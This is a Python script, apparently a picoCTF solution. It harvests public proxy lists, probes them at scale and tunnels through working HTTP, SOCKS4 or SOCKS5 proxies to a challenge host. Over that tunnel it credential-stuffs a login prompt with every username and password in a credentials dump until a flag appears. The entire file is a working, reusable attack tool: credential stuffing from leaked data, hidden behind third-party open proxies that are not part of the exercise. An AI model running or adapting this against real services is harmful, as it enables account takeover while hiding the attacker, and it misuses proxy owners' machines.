"""Broad tunnel hunt: find reachable proxies (any port), then test tunnel to challenge."""
import socket, struct, time, re, concurrent.futures, sys

HOST = "crystal-peak.picoctf.net"
PORT = 58050
CREDS_FILE = "creds-dump.txt"
HOST_IP = socket.gethostbyname(HOST)
print(f"[*] {HOST} -> {HOST_IP}")

def load_lines(path):
    try:
        return [l.strip() for l in open(path, errors="replace") if l.strip()]
    except Exception:
        return []

# Gather all proxies with a kind guess from filename
files = {
    "list_http.txt": "http", "list_socks4.txt": "socks4", "list_socks5.txt": "socks5",
    "mono_http.txt": "http", "mono_socks4.txt": "socks4", "mono_socks5.txt": "socks5",
    "hook_socks5.txt": "socks5", "rooster_https.txt": "http", "speedx_socks5.txt": "socks5",
}
cands = []
seen = set()
for fn, kind in files.items():
    for line in load_lines(fn):
        if ":" not in line or line.startswith("#"):
            continue
        ip, p = line.rsplit(":", 1)
        try:
            p = int(p)
        except ValueError:
            continue
        key = (ip, p)
        # prefer http over socks for CONNECT; keep all kinds
        entry = (kind, ip, p)
        if key not in seen:
            seen.add(key)
            cands.append(entry)
print(f"[*] {len(cands)} unique proxies loaded")

# Stage 1: TCP reachability
def tcp_ok(c, timeout=4):
    kind, ip, p = c
    s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((ip, p)); s.close(); return c
    except Exception:
        try: s.close()
        except: pass
        return None

print("[*] Stage 1: testing TCP reachability...")
t0 = time.time()
reachable = []
with concurrent.futures.ThreadPoolExecutor(max_workers=128) as ex:
    futs = {ex.submit(tcp_ok, c): c for c in cands}
    for fut in concurrent.futures.as_completed(futs):
        r = fut.result()
        if r:
            reachable.append(r)
print(f"[*] {len(reachable)} proxies reachable in {time.time()-t0:.0f}s")
# show port distribution
from collections import Counter
print("  port dist:", Counter(p for _,_,p in reachable).most_common(10))

# Stage 2: tunnel test
def http_connect(ip, p, timeout=6):
    s = socket.socket(); s.settimeout(timeout)
    s.connect((ip, p))
    req = f"CONNECT {HOST}:{PORT} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n\r\n".encode()
    s.sendall(req)
    data = b""
    s.settimeout(timeout)
    while b"\r\n\r\n" not in data and len(data) < 4096:
        chunk = s.recv(1024)
        if not chunk: break
        data += chunk
    first = data.split(b"\r\n",1)[0].decode(errors="replace")
    if " 200 " in first or first.endswith(" 200"):
        return s
    return None

def socks4(ip, p, timeout=6):
    s = socket.socket(); s.settimeout(timeout)
    s.connect((ip, p))
    pkt = b"\x04\x01" + struct.pack(">H", PORT) + socket.inet_aton(HOST_IP) + b"\x00"
    s.sendall(pkt)
    s.settimeout(timeout)
    resp = s.recv(8)
    if len(resp) >= 8 and resp[0] == 0x00 and resp[1] == 0x5A:
        return s
    return None

def socks5(ip, p, timeout=6):
    s = socket.socket(); s.settimeout(timeout)
    s.connect((ip, p))
    s.sendall(b"\x05\x01\x00")
    s.settimeout(timeout)
    r = s.recv(2)
    if len(r) < 2 or r[0] != 0x05 or r[1] != 0x00:
        return None
    hb = HOST.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + struct.pack(">H", PORT))
    r = s.recv(10)
    if len(r) >= 2 and r[1] == 0x00:
        return s
    return None

def tunnel_test(c, timeout=7):
    kind, ip, p = c
    try:
        if kind == "http":
            # try http CONNECT; if proxy is really socks, the recv will fail/empty
            s = http_connect(ip, p, timeout)
            if s: return ("http", ip, p, s)
            return None
        elif kind == "socks4":
            s = socks4(ip, p, timeout)
            if s: return ("socks4", ip, p, s)
            return None
        else:
            s = socks5(ip, p, timeout)
            if s: return ("socks5", ip, p, s)
            return None
    except Exception:
        return None

print("[*] Stage 2: testing tunnels to challenge...")
t0 = time.time()
# Also: for each reachable proxy, additionally try all three protocols regardless of label,
# because list labeling is unreliable. Limit attempts.
work = set()
for c in reachable:
    work.add(c)
# Build a flat attempt list: for each reachable proxy, try http/socks4/socks5
attempts = []
for c in reachable:
    _, ip, p = c
    for k in ("http","socks4","socks5"):
        attempts.append((k, ip, p))
print(f"[*] {len(attempts)} tunnel attempts queued")

found = None
with concurrent.futures.ThreadPoolExecutor(max_workers=128) as ex:
    futs = {ex.submit(tunnel_test, a): a for a in attempts}
    done = 0
    for fut in concurrent.futures.as_completed(futs):
        done += 1
        if done % 100 == 0:
            print(f"  ...{done}/{len(attempts)} ({time.time()-t0:.0f}s)")
        r = fut.result()
        if r:
            found = r
            print(f"\n[+] TUNNEL OK: {r[0]}://{r[1]}:{r[2]}")
            for f in futs: f.cancel()
            break

if not found:
    print("[-] No working tunnel among reachable proxies.")
    sys.exit(3)

kind, ip, p, _ = found
print(f"[*] Will use {kind}://{ip}:{p}")

def open_tunnel(timeout=10):
    try:
        if kind == "http": return http_connect(ip, p, timeout)
        if kind == "socks4": return socks4(ip, p, timeout)
        return socks5(ip, p, timeout)
    except Exception:
        return None

def recv_until(s, marker, timeout=6):
    s.settimeout(timeout); data = b""
    try:
        while marker not in data:
            ch = s.recv(4096)
            if not ch: break
            data += ch
    except socket.timeout: pass
    return data

def try_login(user, pwd, timeout=8):
    s = open_tunnel(timeout)
    if not s: return "TUNNEL_FAIL"
    try:
        data = recv_until(s, b"Username: ", timeout)
        if b"Username: " not in data: return "NO_USER_PROMPT:" + data.decode(errors="replace")[:80]
        s.sendall((user+"\n").encode())
        d2 = recv_until(s, b"Password: ", timeout)
        if b"Password: " not in d2: return "NO_PASS_PROMPT:" + d2.decode(errors="replace")[:80]
        s.sendall((pwd+"\n").encode())
        resp = b""
        try:
            s.settimeout(4)
            while True:
                ch = s.recv(4096)
                if not ch: break
                resp += ch
        except socket.timeout: pass
        return (data+d2+resp).decode("utf-8", errors="replace")
    finally:
        try: s.close()
        except: pass

creds = []
for line in load_lines(CREDS_FILE):
    if ";" in line:
        u, pw = line.split(";", 1)
        creds.append((u.strip(), pw.strip()))
print(f"[*] Loaded {len(creds)} creds. Stuffing...")
flag = None
for i, (u, pw) in enumerate(creds):
    if i % 25 == 0: print(f"  [{i}/{len(creds)}] {u}:{pw}")
    r = try_login(u, pw)
    if r == "TUNNEL_FAIL":
        for _ in range(4):
            r = try_login(u, pw)
            if r != "TUNNEL_FAIL": break
    if r and "picoCTF{" in r:
        m = re.search(r"picoCTF\{[^}]+\}", r)
        print(f"\n[+] FLAG at #{i} {u}:{pw}\n{r[:600]}")
        if m: flag = m.group()
        break
    if r and "TUNNEL" not in r and "NO_USER" not in r and "NO_PASS" not in r:
        low = r.lower()
        if any(k in low for k in ["welcome","granted","authenticated","balance","flag","success","account"]) and not any(k in low for k in ["invalid","incorrect","failed"]):
            print(f"  [?] #{i} {u}:{pw}: {r[:200]}")
print("\n=== DONE ===")
print("FLAG:", flag)